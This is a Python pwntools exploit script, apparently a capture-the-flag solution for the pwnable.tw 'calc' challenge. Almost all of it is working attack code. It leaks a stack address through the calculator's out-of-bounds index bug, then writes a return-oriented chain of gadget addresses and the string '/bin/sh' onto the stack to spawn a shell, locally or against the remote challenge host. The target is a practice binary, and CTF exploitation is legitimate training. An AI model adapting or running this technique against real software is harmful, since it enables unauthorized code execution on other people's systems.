# -*- coding: utf-8 -*-
# @Author: resery
# @Date:   2020-10-22 17:38:18
# @Last Modified by:   resery
# @Last Modified time: 2020-10-22 20:54:16
from pwn import *
from LibcSearcher import LibcSearcher

context.log_level="debug"

if sys.argv[1]=="debug":
	sh = process("./calc")
elif sys.argv[1]=="remote":
	sh=remote("chall.pwnable.tw",10100)

elf = ELF("./calc")

ru = lambda x:sh.recvuntil(x)
rv = lambda x:sh.recv(x)
ra = lambda x:sh.recvall(x)
sl = lambda x:sh.sendline(x)
sd = lambda x:sh.send(x)
sla = lambda x,y:sh.sendlineafter(x,y)
lg = lambda x:log.success(x)

def dbg():
    gdb.attach(sh)

keys=[0x0805c34b,0xb,0x080701d1,0,0,0x08049a21,u32('/bin'),u32('/sh\0')]

def leak_binsh_addr():
    rv(1024)
    sl('+'+str(360))
    ebp_addr = int(sh.recv())
    rsp_addr =((ebp_addr+0x100000000)&0xFFFFFFF0)-16
    binsh_addr = rsp_addr+20-0x100000000
    return binsh_addr

keys[4] = leak_binsh_addr()

def write_stack(addr,content):
    sl('+'+str(addr))
    recv = int(sh.recv())
    if content < recv:
        recv = recv - content
        sl('+'+str(addr)+'-'+str(recv))

    else:
        recv = content-recv
        sl('+'+str(addr)+'+'+str(recv))

    sh.recv()


for i in range(8):
    write_stack(361+i,keys[i])

sl("Pwned_by_Resery")

sh.interactive()